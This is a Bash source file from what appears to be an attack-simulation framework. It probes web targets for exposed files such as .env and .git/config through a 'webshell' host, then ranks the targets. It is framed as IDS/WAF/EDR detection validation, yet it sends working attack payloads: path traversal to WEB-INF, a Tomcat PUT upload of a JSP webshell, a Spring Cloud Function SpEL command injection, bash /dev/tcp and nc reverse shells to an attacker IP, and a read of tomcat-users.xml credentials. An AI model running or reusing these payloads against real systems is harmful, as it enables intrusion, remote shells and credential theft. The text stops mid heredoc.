http_url_scan_telemetry_responses() {
    echo $(($(safe_int "${HTTP_RESPONSES_RECEIVED:-0}") + $(safe_int "${HTTPS_RESPONSES_RECEIVED:-0}")))
}

http_url_scan_reconcile_telemetry_counters() {
    local status_sum success_sum fail_sum telemetry
    status_sum=$(http_url_scan_sum_status_codes)
    success_sum=$(http_url_scan_sum_success_status_codes)
    fail_sum=$(http_url_scan_sum_failed_status_codes)
    telemetry=$(http_url_scan_telemetry_responses)
    if (( telemetry < 1 && status_sum > 0 )); then
        if (( HTTP_RESPONSES_RECEIVED < 1 && (HTTP_200_COUNT + HTTP_400_COUNT + HTTP_403_COUNT + HTTP_404_COUNT) > 0 )); then
            HTTP_RESPONSES_RECEIVED=$((success_sum + HTTP_400_COUNT + HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTP_500_COUNT))
        fi
        if (( HTTPS_RESPONSES_RECEIVED < 1 && (HTTPS_200_COUNT + HTTPS_400_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT) > 0 )); then
            HTTPS_RESPONSES_RECEIVED=$((HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT + HTTPS_401_COUNT + HTTPS_400_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
        fi
    fi
    if (( telemetry < 1 && status_sum > 0 )); then
        HTTP_RESPONSES_RECEIVED="${status_sum}"
        HTTPS_RESPONSES_RECEIVED=0
    fi
}

http_url_scan_accounting_snapshot() {
    local attempted="$1" real_failed="$2" timeouts="$3"
    local val_responses val_real_failed val_timeouts accounted
    attempted=$(safe_int "${attempted}")
    real_failed=$(safe_int "${real_failed}")
    timeouts=$(safe_int "${timeouts}")
    val_responses=$(http_url_scan_sum_success_status_codes)
    val_real_failed=$(http_url_scan_sum_failed_status_codes)
    val_timeouts="${timeouts}"
    if (( val_real_failed < 1 && real_failed > 0 )); then
        val_real_failed="${real_failed}"
    fi
    if (( val_responses + val_real_failed < 1 )); then
        local telemetry
        telemetry=$(http_url_scan_telemetry_responses)
        if (( telemetry > 0 )); then
            if (( val_real_failed < 1 && real_failed > 0 )); then
                val_real_failed="${real_failed}"
                val_responses=$((telemetry - val_real_failed - val_timeouts))
                (( val_responses < 0 )) && val_responses=0
            else
                val_responses="${telemetry}"
            fi
        fi
    fi
    accounted=$((val_responses + val_real_failed + val_timeouts))
    printf '%s %s %s %s\n' "${val_responses}" "${val_real_failed}" "${val_timeouts}" "${accounted}"
}

http_url_scan_validate_counters_fail_fast() {
    local attempted="$1" responses="$2" real_failed="$3" timeouts="$4"
    local sot_attempted=0 sot_completed=0 sot_real_failed=0 sot_timeouts=0 pass=1 ec=0
    attempted=$(safe_int "${attempted}")
    responses=$(safe_int "${responses}")
    if ! http_refresh_sot_from_events; then
        ec=$(event_store_row_count "${EVENT_HTTP_EVENTS:-}")
        if (( (attempted > 0 || responses > 0) && ec == 0 )); then
            http_sot_bug_fail_fast || pass=0
        elif (( attempted > 0 )); then
            http_sot_bug_fail_fast || pass=0
        else
            pass=0
        fi
    else
        sot_attempted=$(safe_int "${HTTP_URL_ATTEMPT_COUNT:-0}")
        sot_completed=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-0}")
        sot_real_failed=$(safe_int "${HTTP_URL_SCAN_REAL_FAILED:-0}")
        sot_timeouts=$(safe_int "${HTTP_URL_SCAN_TIMEOUT_COUNT:-0}")
        attempted="${sot_attempted}"
        ec=$(safe_int "$(event_summary_field "$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)" event_count 0)")
        (( ec < 1 )) && ec=$(event_store_row_count "${EVENT_HTTP_EVENTS:-}")
        if (( (responses > 0 || attempted > 0) && ec == 0 )); then
            http_sot_bug_fail_fast || pass=0
        elif (( attempted > 0 && sot_completed == 0 && sot_real_failed == 0 && sot_timeouts == 0 && ec > 0 )); then
            http_sot_bug_fail_fast || pass=0
        elif (( attempted > 0 && sot_attempted == 0 )); then
            http_sot_bug_fail_fast || pass=0
        else
            log_message "OK" "HTTP_COUNTER_VALIDATION attempted=${sot_attempted} completed=${sot_completed} real_failed=${sot_real_failed} timeouts=${sot_timeouts} result=pass"
        fi
    fi
    local rate=0
    (( attempted > 0 )) && rate=$((sot_completed * 100 / attempted))
    local consistency=fail
    (( pass == 1 )) && consistency=pass
    log_message "OK" "HTTP_URL_SCAN_VALIDATION attempted=${attempted} completed=${sot_completed} real_failed=${sot_real_failed} timeouts=${sot_timeouts} response_rate=${rate}% counter_consistency=${consistency} detection_event_count=${sot_completed}"
    if (( pass == 0 )); then
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        return 1
    fi
    return 0
}

http_url_scan_failover_if_no_responses() {
    local candidates="$1" host="$2" port="$3" scheme="$4" responses="$5"
    local new_host="" new_port="" new_scheme=""
    responses=$(safe_int "${responses}")
    (( responses > 0 )) && return 1
    if pick_http_url_scan_failover_target "${candidates}" "${host}" "${port}" "${scheme}" >/dev/null 2>&1; then
        read -r new_host new_port new_scheme <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
        log_message "WARN" "HTTP_URL_SCAN_FAILOVER from=${scheme}://${host}:${port} to=${new_scheme}://${new_host}:${new_port} reason=no_responses"
        printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
        return 0
    fi
    return 1
}

build_http_url_scan_probe_paths_remote_cmd() {
    local host="$1" port="$2" scheme="$3" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "")
    base_url="${base_url%/}"
    cat <<EOF
bash <<'PROBE_UA_SCRIPT'
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
p400=0;p403=0;p404=0;psuccess=0;ptimeout=0
start=\$(date +%s)
paths=("/WEB-INF/web.xml" "/.env" "/laravel/.env" "/.git/config" "/api/swagger" "/cmd.jsp" "/admin")
for path in "\${paths[@]}"; do
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 3 -A "\$ua" "${base_url}\${path}" 2>/dev/null || echo 000)
code=\$(printf '%s' "\$code" | tr -cd '0-9')
log_http_ua_request "\$path" "\$ua" "\$code"
[[ -z "\$code" || "\$code" == "000" ]] && { ptimeout=\$((ptimeout+1)); continue; }
case "\$code" in
    400) p400=\$((p400+1));;
    403) p403=\$((p403+1));;
    404) p404=\$((p404+1));;
    2*|3*) psuccess=\$((psuccess+1));;
esac
done
end=\$(date +%s); elapsed=\$((end - start))
emit_http_ua_coverage
echo "HTTP_URL_SCAN_PROBE_STATS scheme=${scheme} host=${host} port=${port} probe_400=\$p400 probe_403=\$p403 probe_404=\$p404 probe_success=\$psuccess probe_timeout=\$ptimeout elapsed_sec=\$elapsed"
PROBE_UA_SCRIPT
EOF
}

run_http_url_scan_target_probe() {
    local host="$1" port="$2" scheme="$3" out line
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    if [[ "${DRY_RUN}" == true ]]; then
        local idx="${4:-0}"
        local p400=0 p403=0 p404=0 psuccess=1 ptimeout=0 elapsed=1
        case $((idx % 4)) in
            0) p400=2; p403=1; p404=1; psuccess=1 ;;
            1) p403=2; p404=2; psuccess=1 ;;
            2) p404=3; psuccess=2 ;;
            3) p400=1; p404=1; ptimeout=1 ;;
        esac
        printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=%s probe_403=%s probe_404=%s probe_success=%s probe_timeout=%s elapsed_sec=%s\n' \
            "${scheme}" "${host}" "${port}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" "${elapsed}"
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=0 probe_403=0 probe_404=0 probe_success=0 probe_timeout=5 elapsed_sec=99\n' \
            "${scheme}" "${host}" "${port}"
        return 0
    fi
    out=$(run_webshell_quick "http-url-scan-probe-${scheme}-${host}-${port}" \
        "$(build_http_url_scan_probe_paths_remote_cmd "${host}" "${port}" "${scheme}")" \
        2>/dev/null | tr -d '\r' || true)
    ingest_http_attack_remote_output "${out}" "${host}"
    line=$(printf '%s\n' "${out}" | grep 'HTTP_URL_SCAN_PROBE_STATS' | tail -n1 || true)
    [[ -n "${line}" ]] && printf '%s\n' "${line}" && return 0
    printf 'HTTP_URL_SCAN_PROBE_STATS scheme=%s host=%s port=%s probe_400=0 probe_403=0 probe_404=0 probe_success=0 probe_timeout=5 elapsed_sec=99\n' \
        "${scheme}" "${host}" "${port}"
}

parse_http_url_scan_probe_stats() {
    local line="$1"
    local host port scheme p400 p403 p404 psuccess ptimeout elapsed
    host=$(sed -n 's/.*host=\([^ ]*\).*/\1/p' <<< "${line}")
    port=$(safe_int "$(sed -n 's/.*port=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    scheme=$(sed -n 's/.*scheme=\([^ ]*\).*/\1/p' <<< "${line}")
    p400=$(safe_int "$(sed -n 's/.*probe_400=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    p403=$(safe_int "$(sed -n 's/.*probe_403=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    p404=$(safe_int "$(sed -n 's/.*probe_404=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    psuccess=$(safe_int "$(sed -n 's/.*probe_success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    ptimeout=$(safe_int "$(sed -n 's/.*probe_timeout=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    elapsed=$(safe_int "$(sed -n 's/.*elapsed_sec=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    printf '%s %s %s %s %s %s %s %s %s\n' "${host}" "${port}" "${scheme}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" "${elapsed}"
}

score_http_url_scan_probe() {
    local p400="$1" p403="$2" p404="$3" ptimeout="$4" elapsed="$5" scheme="$6"
    local fail403404=$((p403 + p404)) scheme_bonus=0
    [[ "${scheme}" == "http" ]] && scheme_bonus=10
    echo $((p400 * 1000000 + fail403404 * 10000 - ptimeout * 1000 - elapsed + scheme_bonus))
}

fast_safe_http_port_priority_score() {
    local port
    port=$(safe_int "$1")
    case "${port}" in
        8080) printf '700' ;;
        8443) printf '650' ;;
        8000) printf '600' ;;
        9000) printf '550' ;;
        80) printf '200' ;;
        443) printf '150' ;;
        *) printf '100' ;;
    esac
}

fast_safe_http_status_priority_score() {
    local p400="$1" p403="$2" p404="$3" psuccess="$4"
    p400=$(safe_int "${p400}")
    p403=$(safe_int "${p403}")
    p404=$(safe_int "${p404}")
    psuccess=$(safe_int "${psuccess}")
    if (( p400 > 0 )); then
        printf '1000000 400'
    elif (( p403 > 0 )); then
        printf '950000 403'
    elif (( p404 > 0 )); then
        printf '900000 404'
    elif (( psuccess > 0 )); then
        printf '500000 200'
    else
        printf '100000 000'
    fi
}

fast_safe_log_http_target_score() {
    local target="$1" port="$2" status="$3" score="$4" reason="$5"
    log_message "OK" "HTTP_TARGET_SCORE target=${target} port=${port} status=${status} score=${score} reason=${reason}"
}

http_url_scan_is_redirect_only_target() {
    local classification="$1"
    [[ "${classification}" == http_redirect ]] && return 0
    return 1
}

http_url_scan_compute_target_detection_score() {
    local p400="$1" p403="$2" p404="$3" p301="$4" p302="$5" ptimeout="$6"
    local score=0
    p400=$(safe_int "${p400}")
    p403=$(safe_int "${p403}")
    p404=$(safe_int "${p404}")
    p301=$(safe_int "${p301}")
    p302=$(safe_int "${p302}")
    ptimeout=$(safe_int "${ptimeout}")
    score=$((p400 * 1000 + p403 * 500 + p404 * 300 - p301 * 10000 - p302 * 10000 - ptimeout * 100))
    printf '%s' "${score}"
}

http_url_scan_commit_best_target() {
    local host="$1" port="$2" scheme="$3" score="$4" reason="${5:-highest_detection_score}"
    local target=""
    score=$(safe_int "${score}")
    (( score <= HTTP_URL_SCAN_BEST_DETECTION_SCORE )) && return 0
    target="${scheme}://${host}:${port}"
    HTTP_URL_SCAN_BEST_TARGET="${target}"
    HTTP_URL_SCAN_BEST_SELECTION_LINE="${host} ${port} ${scheme}"
    HTTP_URL_SCAN_BEST_DETECTION_SCORE="${score}"
    log_message "OK" "HTTP_TARGET_SELECTED target=${target} reason=${reason} score=${score}"
    state_append "http_url_scan_target_selection.log" "HTTP_TARGET_SELECTED target=${target} reason=${reason} score=${score}"
}

# Fast-safe: score reachable service-discovery targets (no candidate-discovery sweep).
select_http_url_scan_target_fast_safe_scored() {
    local candidates="$1" target_line host port scheme candidate_count=0 idx=0 max_probe=8
    local p400 p403 p404 psuccess ptimeout elapsed score best_score=-999999999
    local best_host="" best_port="" best_scheme="" best_status="000" best_reason=""
    local best_p400=0 best_p403=0 best_p404=0 best_psuccess=0
    local status_score port_score combined status_label probe_line sel_reason=""
    local probe_cache="${LOG_DIR}/http_url_scan_probe_cache.tsv"
    : > "${probe_cache}" 2>/dev/null || true
    candidate_count=$(printf '%s\n' "${candidates}" | awk 'NF{c++} END{print c+0}')
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        (( idx >= max_probe )) && break
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
        if fast_safe_stage_budget_exceeded "http" 2>/dev/null; then
            log_message "WARN" "HTTP_TARGET_SCORE action=stop reason=http_stage_budget_exceeded"
            break
        fi
        probe_line=$(run_http_url_scan_target_probe "${host}" "${port}" "${scheme}" "${idx}")
        read -r host port scheme p400 p403 p404 psuccess ptimeout elapsed <<< "$(parse_http_url_scan_probe_stats "${probe_line}")"
        read -r status_score status_label <<< "$(fast_safe_http_status_priority_score "${p400}" "${p403}" "${p404}" "${psuccess}")"
        port_score=$(fast_safe_http_port_priority_score "${port}")
        combined=$((status_score + port_score - ptimeout * 1000 - elapsed))
        best_reason="status=${status_label} port_priority=${port} probe_400=${p400} probe_403=${p403} probe_404=${p404}"
        fast_safe_log_http_target_score "${scheme}://${host}:${port}" "${port}" "${status_label}" "${combined}" "${best_reason}"
        if (( combined > best_score )); then
            best_score="${combined}"
            best_host="${host}"
            best_port="${port}"
            best_scheme="${scheme}"
            best_status="${status_label}"
            best_p400="${p400}"
            best_p403="${p403}"
            best_p404="${p404}"
            best_psuccess="${psuccess}"
        fi
        idx=$((idx + 1))
    done <<< "${candidates}"
    HTTP_URL_SCAN_CANDIDATE_COUNT="${candidate_count}"
    if [[ -z "${best_host}" ]]; then
        HTTP_URL_SCAN_SELECTED_TARGET=""
        HTTP_URL_SCAN_SELECTION_LINE=""
        log_http_url_scan_target_selection "0" "none" "no_reachable_candidates" "0" "0" "0" "0" "0"
        return 1
    fi
    HTTP_URL_SCAN_SELECTED_TARGET="${best_scheme}://${best_host}:${best_port}"
    HTTP_URL_SCAN_SELECTION_LINE="${best_host} ${best_port} ${best_scheme}"
    sel_reason="fast_safe_scored_status_then_port"
    fast_safe_log_http_target_score "${HTTP_URL_SCAN_SELECTED_TARGET}" "${best_port}" "${best_status}" "${best_score}" "selected ${sel_reason}"
    log_http_url_scan_target_selection "${candidate_count}" "${HTTP_URL_SCAN_SELECTED_TARGET}" "${sel_reason}" \
        "${best_p400}" "${best_p403}" "${best_p404}" "${best_psuccess}" "0"
    http_url_scan_commit_best_target "${best_host}" "${best_port}" "${best_scheme}" "${best_score}" "highest_detection_score"
    printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
}

select_http_url_scan_target_fast_reachable_only() {
    select_http_url_scan_target_fast_safe_scored "$@"
}

select_http_url_scan_concentrated_target() {
    local candidates="$1" target_line host port scheme probe_line idx=0 candidate_count=0
    if fast_safe_mode_enabled 2>/dev/null; then
        select_http_url_scan_target_fast_reachable_only "${candidates}"
        return $?
    fi
    local p400 p403 p404 psuccess ptimeout elapsed score best_score=-999999999
    local best_host="" best_port="" best_scheme="" best_p400=0 best_p403=0 best_p404=0 best_psuccess=0 best_ptimeout=0
    local sel_reason="" probe_cache="${LOG_DIR}/http_url_scan_probe_cache.tsv"
    : > "${probe_cache}" 2>/dev/null || true
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
        probe_line=$(run_http_url_scan_target_probe "${host}" "${port}" "${scheme}" "${idx}")
        read -r host port scheme p400 p403 p404 psuccess ptimeout elapsed <<< "$(parse_http_url_scan_probe_stats "${probe_line}")"
        score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "${elapsed}" "${scheme}")
        printf '%s|%s|%s|%s|%s|%s|%s|%s|%s\n' "${host}" "${port}" "${scheme}" "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" >> "${probe_cache}" 2>/dev/null || true
        if (( score > best_score )); then
            best_score="${score}"
            best_host="${host}"
            best_port="${port}"
            best_scheme="${scheme}"
            best_p400="${p400}"
            best_p403="${p403}"
            best_p404="${p404}"
            best_psuccess="${psuccess}"
            best_ptimeout="${ptimeout}"
        fi
        idx=$((idx + 1))
        candidate_count=$((candidate_count + 1))
    done <<< "${candidates}"
    HTTP_URL_SCAN_CANDIDATE_COUNT="${candidate_count}"
    if [[ -z "${best_host}" ]]; then
        HTTP_URL_SCAN_SELECTED_TARGET=""
        HTTP_URL_SCAN_SELECTION_LINE=""
        log_http_url_scan_target_selection "0" "none" "no_reachable_candidates" "0" "0" "0" "0" "0"
        return 1
    fi
    HTTP_URL_SCAN_SELECTED_TARGET="${best_scheme}://${best_host}:${best_port}"
    HTTP_URL_SCAN_SELECTION_LINE="${best_host} ${best_port} ${best_scheme}"
    sel_reason="ranked_by_probe_400_then_403_404_then_latency_http_preferred"
    log_http_url_scan_target_selection "${candidate_count}" "${HTTP_URL_SCAN_SELECTED_TARGET}" "${sel_reason}" \
        "${best_p400}" "${best_p403}" "${best_p404}" "${best_psuccess}" "${best_ptimeout}"
    http_url_scan_commit_best_target "${best_host}" "${best_port}" "${best_scheme}" \
        "$(http_url_scan_compute_target_detection_score "${best_p400}" "${best_p403}" "${best_p404}" "0" "0" "${best_ptimeout}")" \
        "highest_detection_score"
    printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
}

# If concentrated target precheck fails (e.g. HTTP/0.9), pick next probe-ranked candidate that passes precheck.
pick_http_url_scan_failover_target() {
    local candidates="$1" skip_host="$2" skip_port="$3" skip_scheme="$4"
    local target_line host port scheme url precheck_line precheck_cmd precheck_ec precheck_out classification
    local cache="${LOG_DIR}/http_url_scan_probe_cache.tsv" best_score=-999999999
    local best_host="" best_port="" best_scheme="" h p s p400 p403 p404 psuccess ptimeout score
    _pick_http_failover_from_ranked() {
        local h="$1" p="$2" s="$3" sc="$4"
        [[ -z "${h}" ]] && return 1
        [[ "${h}" == "${skip_host}" && "${p}" == "${skip_port}" && "${s}" == "${skip_scheme}" ]] && return 1
        read -r host port scheme <<< "$(normalize_http_scan_target_fields "${h}" "${p}" "${s}")"
        url="${scheme}://${host}:${port}/"
        precheck_line=$(poc_precheck_http "${url}")
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        http_url_scan_is_redirect_only_target "${classification}" && return 1
        poc_obs_should_run_http_followup "${classification}" || return 1
        (( sc > best_score )) || return 1
        best_score="${sc}"
        best_host="${host}"
        best_port="${port}"
        best_scheme="${scheme}"
        return 0
    }
    if [[ -f "${cache}" ]]; then
        while IFS='|' read -r h p s p400 p403 p404 psuccess ptimeout; do
            [[ -z "${h}" ]] && continue
            score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "0" "${s}")
            _pick_http_failover_from_ranked "${h}" "${p}" "${s}" "${score}" || true
        done < "${cache}"
    fi
    if [[ -z "${best_host}" ]]; then
        while IFS= read -r target_line; do
            [[ -z "${target_line}" ]] && continue
            if [[ "${target_line}" == *" "* ]]; then
                read -r h p s <<< "${target_line}"
            elif read -r h p s <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
                :
            elif read -r h p s <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
                :
            else
                continue
            fi
            score=0
            if read -r p400 p403 p404 psuccess ptimeout <<< "$(lookup_http_url_scan_probe_cache "${h}" "${p}" "${s}" 2>/dev/null)"; then
                score=$(score_http_url_scan_probe "${p400}" "${p403}" "${p404}" "${ptimeout}" "0" "${s}")
            fi
            _pick_http_failover_from_ranked "${h}" "${p}" "${s}" "${score}" || true
        done <<< "${candidates}"
    fi
    [[ -z "${best_host}" ]] && return 1
    HTTP_URL_SCAN_SELECTED_TARGET="${best_scheme}://${best_host}:${best_port}"
    HTTP_URL_SCAN_SELECTION_LINE="${best_host} ${best_port} ${best_scheme}"
    log_message "OK" "HTTP_URL_SCAN_FAILOVER selected=${HTTP_URL_SCAN_SELECTED_TARGET} skipped=${skip_scheme}://${skip_host}:${skip_port} reason=precheck_failover"
    printf '%s %s %s\n' "${HTTP_URL_SCAN_SELECTION_LINE}"
}

lookup_http_url_scan_probe_cache() {
    local host="$1" port="$2" scheme="$3" cache="${LOG_DIR}/http_url_scan_probe_cache.tsv"
    local h p s p400 p403 p404 psuccess ptimeout
    [[ -f "${cache}" ]] || return 1
    while IFS='|' read -r h p s p400 p403 p404 psuccess ptimeout; do
        [[ "${h}" == "${host}" && "${p}" == "${port}" && "${s}" == "${scheme}" ]] && \
            printf '%s %s %s %s %s\n' "${p400}" "${p403}" "${p404}" "${psuccess}" "${ptimeout}" && return 0
    done < "${cache}"
    return 1
}

# Reuse reachable web targets for IDS/WAF/EDR signature probes (same pool as URL scan).
select_active_web_server_targets() {
    select_http_scan_targets
}

parse_sig_probe_stats_line() {
    local out="$1" line
    local attempted=0 responses=0 traversal=0 tomcat_put=0 spring_hdr=0 edr_cmd=0
    line=$(printf '%s\n' "${out}" | grep 'SIG_PROBE_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        traversal=$(safe_int "$(sed -n 's/.*traversal=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        tomcat_put=$(safe_int "$(sed -n 's/.*tomcat_put=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring_hdr=$(safe_int "$(sed -n 's/.*spring_hdr=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        edr_cmd=$(safe_int "$(sed -n 's/.*edr_cmd=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${traversal}" "${tomcat_put}" "${spring_hdr}" "${edr_cmd}"
}

# Safe signature-only HTTP probes (no command execution on operator host; plain-text IDS/WAF/EDR patterns).
build_ids_waf_signature_probe_remote_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4" attacker_ip="$5"
    local base_url curl_tls=""
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    attacker_ip="${attacker_ip:-127.0.0.1}"
    cat <<EOF
bash <<'SIG_UA_SCRIPT'
${REMOTE_SHELL_HELPERS}
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
curl_tls='${curl_tls}'
base='${base_url}'
base="\${base%/}/"
campaign='${campaign}'
attacker='${attacker_ip}'
at=0; resp=0; trav=0; tomcat_put=0; spring_hdr=0; edr_cmd=0
sig_http_code(){
local code path ua
code="\$1"; path="\$2"; ua="\$3"
code=\$(printf '%s' "\$code" | tr -cd '0-9')
[ -z "\$code" ] && code=000
log_http_ua_request "\$path" "\$ua" "\$code"
at=\$((at+1))
[ "\$code" != "000" ] && resp=\$((resp+1))
}
sig_req(){
local path="\$1"; shift
local ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
local code
code=\$(curl \${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 -A "\$ua" "\$@" 2>/dev/null || echo 000)
sig_http_code "\$code" "\$path" "\$ua"
}
sig_req "/app/download.jsp?file=../../../../WEB-INF/web.xml" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
"\${base}app/download.jsp?file=../../../../WEB-INF/web.xml"
trav=\$((trav+1))
sig_req "/view.jsp?path=../../../../WEB-INF/classes/" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
"\${base}view.jsp?path=../../../../WEB-INF/classes/"
trav=\$((trav+1))
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
code=\$(curl \${curl_tls} -s -o /dev/null -w '%{http_code}' -X PUT --max-time 5 -A "\$ua" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
-d '<% out.println("Webshell"); %>' "\${base}backdoor.jsp/" 2>/dev/null || echo 000)
sig_http_code "\$code" "/backdoor.jsp/" "\$ua"; tomcat_put=1
sig_req "/" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
-H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \\
"\${base}"
spring_hdr=1
sig_req "/cmd.jsp?cmd=bash" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
"\${base}cmd.jsp?cmd=bash+-i+>%26+/dev/tcp/\${attacker}/4444+0>%261"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=nc" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
"\${base}cmd.jsp?cmd=nc+\${attacker}+4444+-e+/bin/sh"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=cat" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
"\${base}cmd.jsp?cmd=cat+/usr/local/tomcat/conf/tomcat-users.xml"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=find" \\
-H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
"\${base}cmd.jsp?cmd=find+/+-name+*properties+-o+-name+*config.xml+2>/dev/null"
edr_cmd=\$((edr_cmd+1))
emit_http_ua_coverage
echo "SIG_PROBE_STATS scheme=${scheme} host=${host} port=${port} attempted=\${at} responses=\${resp} traversal=\${trav} tomcat_put=\${tomcat_put} spring_hdr=\${spring_hdr} edr_cmd=\${edr_cmd} campaign=\${campaign}"
SIG_UA_SCRIPT
EOF
}

run_ids_waf_signature_probe_for_target() {
    local host="$1" port="$2" scheme="$3" out remote_cmd
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "IDS/WAF signature probe skipped for ${host}:${port} — curl missing on webshell host" >&2
        return 1
    fi
    remote_cmd=$(build_ids_waf_signature_probe_remote_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}" "${ATTACKER_IP:-127.0.0.1}")
    out=$(run_webshell_long "ids-waf-sig-${scheme}-${host}-${port}" "${remote_cmd}" 2>/dev/null || true)
    ingest_http_attack_remote_output "${out}" "${host}"
    printf '%s' "${out}"
}

format_ids_waf_signature_probe_block() {
    cat <<EOF
IDS/WAF/EDR Signature Probe (detection-rule validation traffic)
- Status                    : ${IDS_WAF_SIG_PROBE_STATUS}
- Active web targets        : ${IDS_WAF_SIG_TARGET_COUNT}
- Signatures attempted      : ${IDS_WAF_SIG_ATTEMPTED}
- HTTP responses received   : ${IDS_WAF_SIG_RESPONSES}
- Traversal signatures      : ${IDS_WAF_SIG_TRAVERSAL}
- Tomcat PUT signature      : ${IDS_WAF_SIG_TOMCAT_PUT}
- Spring header signature   : ${IDS_WAF_SIG_SPRING_HDR}
- EDR cmd.jsp signatures    : ${IDS_WAF_SIG_EDR_CMD}
